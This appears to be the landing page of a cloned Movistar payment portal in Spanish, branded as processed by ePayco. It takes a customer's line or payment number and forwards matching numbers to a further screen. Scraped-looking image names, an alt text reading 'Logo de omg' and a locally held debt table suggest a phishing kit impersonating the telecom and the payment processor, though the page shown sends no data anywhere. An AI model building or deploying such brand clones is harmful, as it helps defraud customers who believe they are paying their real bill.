<!doctype html>
<html lang="es">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <meta name="description" content="Portal de recaudos Movistar, paga o programa tus facturas de forma fácil y rápida"/>
    <meta name="theme-color" content="#019DF4"/>
    <link rel="shortcut icon" href="img/apple-touch-icon.png" type="image/x-icon">

    <!-- Stylesheets -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet"/>
    <link href="styles.css" rel="stylesheet"> <!-- Enlace al CSS separado -->
    
    <title>Movistar Portal de Recaudos</title>   
    <script src="./epayco/js/functions.js"></script>
</head>
<body>
    <header class="header">
        <img src="img/descarga.png" alt="Encabezado de Movistar" class="header-image"/>
        <div class="header-footer-text d-md-none">
            <img src="img/png-transparent-computer-icons-password-login-user-padlock-miscellaneous-christianity-rectangle.png" alt="Ícono de candado" class="lock-icon"/>
            <span>Pagos procesados por <img src="img/logo_ePayco.1722863467828.png" alt="Logo de omg" class="omg-logo"/></span>
        </div>
    </header>
    <div class="main-container">
        <div class="content-container">
            <div class="button-container text-center mb-4">
                <button class="btn btn-primary btn-small" id="payBillButton">Movistar</button>
                <button class="btn btn-secondary btn-small" id="otherBillButton1">Antes Telebucaramanga</button>
                <button class="btn btn-secondary btn-small" id="otherBillButton2">Antes Metrotel</button>
            </div>
            <div id="billContent">
                <div class="text-center">
                    <h2 class="mb-4">
                        <span class="thin-text">Pagar mi factura </span><span class="bold-text">Movistar</span>
                    </h2>
                </div>
                
                <div class="form-group">
                    <div class="btn-group d-flex justify-content-center" role="group" aria-label="Tipo de línea">
                        <input type="radio" class="btn-check" name="lineType" id="mobileLine" autocomplete="off" checked>
                        <label class="btn btn-outline-primary" for="mobileLine">Móvil</label>

                        <input type="radio" class="btn-check" name="lineType" id="fixedLine" autocomplete="off">
                        <label class="btn btn-outline-primary" for="fixedLine">Fija</label>
                    </div>
                    <div class="input-group mt-3">
                        <img src="img/mobile-phone-or-smartphone-line-icon-outline-sign-linear-style-pictogram-isolated-on-white-symbol-logo-illustration-editable-stroke-vector.png" alt="Icono de teléfono" class="phone-icon"/>
                        <input type="text" id="line-number" class="form-control line-input" placeholder="Ingresa el número de línea o de pago"/>
                    </div>
                    <small class="form-text text-muted">Ingresa el número de línea o de pago</small>
                    <div class="input-group mt-3">
                       
                    </div>
                    
                </div>
                <div class="button-container text-center">
                    <button id="consultPayButton" class="btn btn-secondary-disabled" disabled>Consultar y pagar</button>
                </div>
                <div class="button-container text-center mt-2">     
                    <button id="schedulePayButton" class="btn btn-secondary-disabled" disabled>Programar / Administrar mis pagos</button>
                </div>
                <div class="footer-text text-center d-none d-md-block">
                    <img src="img/png-transparent-computer-icons-password-login-user-padlock-miscellaneous-christianity-rectangle.png" alt="Ícono de candado" class="lock-icon"/>
                    <span>Pagos procesados por <img src="img/logo_ePayco.1722863467828.png" alt="Logo de omg" class="omg-logo"/></span>
                </div>
                <div class="payment-methods text-center">
                    <h3>
                        <span class="bold-text">Nuevos medios de pago</span> <span class="thin-text">disponibles para ti</span>
                    </h3>
                    
                    <div class="icons-container">
                        <img src="img/4.jpeg" alt="Icono 1" class="payment-icon">
                        <img src="img/1.png" alt="Icono 2" class="payment-icon">
                        <img src="img/2.jpeg" alt="Icono 3" class="payment-icon">
                        <img src="img/3.jpeg" alt="Icono 4" class="payment-icon">
                    </div>
                </div>
            </div>
        </div>

        <div class="image-container">
            <img src="img/Background-mob.webp" alt="Publicidad" class="advertisement-image"/>
        </div>
    </div>  
    
    <div id="spinnerOverlay" class="spinner-overlay d-none">
        <div class="spinner-border" role="status">
            <span class="visually-hidden">Loading...</span>
        </div>
    </div>
    
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="scripts.js"></script> <!-- Enlace al JS separado -->
    <script>
        document.getElementById("consultPayButton").addEventListener("click", function () {
            const lineNumber = document.getElementById("line-number").value.trim();
            if (window.debtMap && window.debtMap[lineNumber]) {
                localStorage.setItem("lineNumber", lineNumber);
                window.location.href = "screen2.html";
            }
        });
    </script>
</body>
</html>
